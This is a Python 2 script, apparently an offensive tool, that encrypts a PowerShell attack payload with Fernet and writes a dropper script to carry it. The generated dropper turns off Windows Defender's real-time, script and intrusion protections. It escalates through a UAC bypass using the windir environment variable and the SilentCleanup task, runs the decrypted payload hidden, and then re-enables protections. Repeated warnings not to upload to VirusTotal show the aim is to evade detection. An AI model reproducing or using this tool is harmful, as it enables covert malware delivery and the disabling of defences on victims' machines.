#!/usr/local/bin/python
# coding: latin-1
#@Author :#Captain_Nemo

from cryptography.fernet import Fernet
import os
import sys
import random
import time
import subprocess

class bcolors:
  BLUE = '\033[94m'
  GREEN = '\033[92m'
  WARNING = '\033[93m'
  WHITE = '\033[97m'
  ERROR = '\033[91m'
  ENDC = '\033[0m'
  BOLD = '\033[1m'
  UNDERLINE = '\033[4m'


with open(sys.argv[1], 'r+') as f:
   contents = f.read()
   banner = '''
                                      █████████████████████████████
                                      █████████████████████████████
                                      ████ ▄▄▄▄▄ █ ▄ █ █ ▄▄▄▄▄ ████
                                      ████ █   █ █ ▀▀ ██ █   █ ████
                                      ████ █▄▄▄█ █▀▀█▀ █ █▄▄▄█ ████
                                      ████▄▄▄▄▄▄▄█▄▀ █▄█▄▄▄▄▄▄▄████
                                      ████▄ █▀▄ ▄██▄██▄██▄▀▄▄▄ ████
                                      ████▀▀▄▄▀ ▄▀▀   █▀█ █▀▀▀▀████
                                      ████████▄▄▄▄▀█▀█  ▄  ▀█ █████
                                      ████ ▄▄▄▄▄ █▀▄▄  █▀█▀ ▀█▄████
                                      ████ █   █ █▄█▀ ▄▀▄█▀▀▀ ▀████
                                      ████ █▄▄▄█ █▀▄█ ▄█ █▄▄▀█▀████
                                      ████▄▄▄▄▄▄▄█▄▄▄███▄██▄█▄▄████
                                      █████████████████████████████
                                      █████████████████████████████

          '''
print banner.decode('utf-8')

print bcolors.BOLD + bcolors.WHITE + "                                              [+] Author :#Captain_Nemo"
print bcolors.BOLD + bcolors.WHITE + "                                              [+] HACK-ATHON BOOK OF WISDOM "
print bcolors.BOLD + bcolors.WHITE + "                                              [+] YOUTUBE CHANNEL : https://www.youtube.com/channel/UCA1eZ38TvjtyhpLtcZ9UHEQ"
print bcolors.BOLD + bcolors.WHITE + "                                              [+] FACEBOOK : https://www.facebook.com/Hack-Athon-BOOK-of-Wisdom-1258144607678680"
print bcolors.BOLD + bcolors.WHITE + "                                              [+] TWITTER : https://twitter.com/AthonOf"
print bcolors.BOLD + bcolors.WHITE + "                                              [+] GITHUB : https://github.com/1captainnemo1"
 
#time.sleep(3)

print "\n\n\n"

print bcolors.BOLD + bcolors.WHITE + "[+] This Module will attempt to Obfuscate powershell Attack Vectors"

print bcolors.BLUE + "[+] Raw payload"
print " ============================================================================================="
print contents
print " ============================================================================================="
print bcolors.ERROR + bcolors.BOLD + "[+] Generating Fernet MultiKey"
key = Fernet.generate_key()
print bcolors.BOLD + bcolors.WHITE + "[+] Key = " + key
print bcolors.WHITE + "[+] Please make note of the Key for decryption"

print  bcolors.BOLD + "[+] Generating Fernet Object....please wait"
f = Fernet(key)
print  bcolors.BOLD + bcolors.WHITE + "[+] Fernet Object Generated at :"  
print  f
print bcolors.ERROR + bcolors.BOLD + "[+] Encrypting Payload"
time.sleep(2)
print bcolors.BOLD + bcolors.WHITE +  "================================================================================="
enc_payload = f.encrypt(contents)
print bcolors.BOLD + bcolors.WHITE + "[+] Encrypted Payload : " + enc_payload
print bcolors.BOLD + bcolors.WHITE +  "================================================================================="

print bcolors.ERROR + bcolors.BOLD + "[+] Writing RAW payload to file, Please wait"
Filename = "_PSRawPayload%i"%random.randint(1,10000000001)+".txt"
#print Filename # bookmark 

f1 = open("_PSRawPayload%i"%random.randint(1,10000000001)+".txt", "a")
f1.write(enc_payload)
f1.close()

print  bcolors.BOLD + bcolors.WHITE + "[+] Raw Encrypted Payload written to :" + f1.name

print bcolors.BLUE + bcolors.BOLD + "[+] Do You want to continue  generating the Executable payload (Y/N)"
decision = str(raw_input("enter Y or N\n"))

if decision == 'N':
   print bcolors.BOLD + bcolors.WHITE + "[+]  Have a nice day !!"
   print bcolors.BOLD + bcolors.WHITE + "[+]  DO NOT UPLOAD TO VIRUSTOTAL !!!"
   sys.exit(0)
elif decision == 'Y':
    
    # Create final Obfuscated Executable Python  payload 
    print bcolors.BOLD + bcolors.WHITE + "[+] Generating Final Obfuscated python Payload, Please wait"
    time.sleep(2)
    final_payload = open("PSFinalPayload%i"%random.randint(1,10000000001)+".py", "w")
    final_payload.write("""
from cryptography.fernet import Fernet
import os
import sys
import subprocess
import time 

key = """ + "\'"+key+"\'")
final_payload.write("""
f_obj= Fernet(key)
enc_pay =""" "\'"+enc_payload+"\'")
final_payload.write("""

#Disable Notification

#subprocess.Popen(['powershell.exe', '-NoProfile', '-Command',"if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -#match "S-1-5-32-544")){Set-ItemProperty -Path HKCU:\Software\Policies\Microsoft\Windows\Explorer -Name DisableNotificationCenter -Type #DWord -Value 1 } else {$registryPath = "HKCU:\Environment" $Name = "windir" $Value = "powershell -ep bypass -w h $PSCommandPath;#" Set-#ItemProperty -Path $registryPath -Name $name -Value $Value schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-#Null  Remove-ItemProperty -Path $registryPath -Name $name"}])

#subprocess.Popen(['powershell.exe', '-NoProfile', '-Command',"if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -#match "S-1-5-32-544")){Set-ItemProperty -Path HCKU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications -Name ToastEnabled -#Type DWord -Value 0 } else {$registryPath = "HKCU:\Environment" $Name = "windir" $Value = "powershell -ep bypass -w h $PSCommandPath;#" #Set-ItemProperty -Path $registryPath -Name $name -Value $Value schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-#Null  Remove-ItemProperty -Path $registryPath -Name $name"}])
#time.sleep(20)

#Disable AV
subprocess.Popen(['powershell.exe', '-NoProfile', '-Command', 'if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")){Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true}else{$registryPath = "HKCU:\Environment";$Name = "windir" ;$Value = "powershell -ep bypass -w h $PSCommandPath";Set-ItemProperty -Path $registryPath -Name $name -Value $Value;schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null ; Remove-ItemProperty -Path $registryPath -Name $name}'])

time.sleep(90)

subprocess.Popen(['powershell.exe', '-NoProfile', '-Command', f_obj.decrypt(enc_pay).decode()])

time.sleep(90)

#Enable AV
subprocess.Popen(['powershell.exe', '-NoProfile', '-Command', 'if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")){Set-MpPreference -DisableIntrusionPreventionSystem $false -DisableIOAVProtection $false -DisableRealtimeMonitoring $false -DisableScriptScanning $false}else{$registryPath = "HKCU:\Environment";$Name = "windir" ;$Value = "powershell -ep bypass -w h $PSCommandPath";Set-ItemProperty -Path $registryPath -Name $name -Value $Value;schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null ; Remove-ItemProperty -Path $registryPath -Name $name}'])

#Enable notification

#subprocess.Popen(['powershell.exe', '-NoProfile', '-Command',"if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -#match "S-1-5-32-544")){Set-ItemProperty -Path HKCU:\Software\Policies\Microsoft\Windows\Explorer -Name DisableNotificationCenter -Type #DWord -Value 0 } else {$registryPath = "HKCU:\Environment" $Name = "windir" $Value = "powershell -ep bypass -w h $PSCommandPath;#" Set-#ItemProperty -Path $registryPath -Name $name -Value $Value schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-#Null  Remove-ItemProperty -Path $registryPath -Name $name"}])

#subprocess.Popen(['powershell.exe', '-NoProfile', '-Command',"if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -#match "S-1-5-32-544")){Set-ItemProperty -Path HCKU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications -Name ToastEnabled -#Type DWord -Value 1 } else {$registryPath = "HKCU:\Environment" $Name = "windir" $Value = "powershell -ep bypass -w h $PSCommandPath;#" #Set-ItemProperty -Path $registryPath -Name $name -Value $Value schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-#Null  Remove-ItemProperty -Path $registryPath -Name $name"}])

""")
final_payload.close()
print  bcolors.BOLD + bcolors.WHITE + "[+] Final Encrypted encrypted Powershell Python Payload written to : " + final_payload.name
print bcolors.BLUE + bcolors.BOLD + "[+] HACK THE MULTIVERSE "
decr = 5
while True:
         print bcolors.ERROR + bcolors.BOLD + "[+] DO  NOT UPLOAD TO VIRUSTOTAL"
         decr = decr-1
         if(decr <=0):
           break
           sys.exit(0)
else: 
     sys.exit(0)
     print bcolors.ERROR + bcolors.BOLD + "[+] Respond in Y or N ONLY" 
     sys.exit(0)
